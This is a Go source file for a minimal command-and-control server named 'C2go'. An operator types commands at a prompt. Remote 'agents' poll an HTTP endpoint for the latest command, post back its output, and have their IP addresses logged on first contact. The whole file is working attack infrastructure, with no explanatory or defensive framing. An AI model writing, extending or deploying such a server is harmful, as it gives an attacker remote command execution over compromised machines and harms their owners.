package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
)

var (
	lastCommand string
	output      string
	mu          sync.Mutex
	seenAgents  = make(map[string]bool)
	commandChan = make(chan string)
)

// ANSI color codes
const (
	green  = "\033[32m"
	yellow = "\033[33m"
	cyan   = "\033[36m"
	reset  = "\033[0m"
)

func printLog(msg string, color string) {
	mu.Lock()
	defer mu.Unlock()
	fmt.Printf("\r%s%s%s\n", color, msg, reset)
	fmt.Print("cmd> ") // re-display prompt
}

func getCommandHandler(w http.ResponseWriter, r *http.Request) {
	ip, _, _ := net.SplitHostPort(r.RemoteAddr)

	mu.Lock()
	if !seenAgents[ip] {
		seenAgents[ip] = true
		go printLog(fmt.Sprintf("[+] First connection from %s", ip), green)
	}
	mu.Unlock()

	fmt.Fprint(w, lastCommand)
	lastCommand = "" // clear after sending
}

func sendResultHandler(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadAll(r.Body)

	mu.Lock()
	output = string(body)
	mu.Unlock()

	go printLog("[+] Got result from agent:\n"+output, cyan)
	fmt.Fprintln(w, "Result received")
}

func getOutputHandler(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()
	fmt.Fprint(w, output)
}

func sendCommandCLI() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("cmd> ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd != "" {
			mu.Lock()
			lastCommand = cmd
			mu.Unlock()
		}
	}
}

func main() {
	http.HandleFunc("/get", getCommandHandler)
	http.HandleFunc("/result", sendResultHandler)
	http.HandleFunc("/output", getOutputHandler)

	go sendCommandCLI()

	fmt.Println("C2go server listening on http://0.0.0.0:8080")
	http.ListenAndServe(":8080", nil)
}

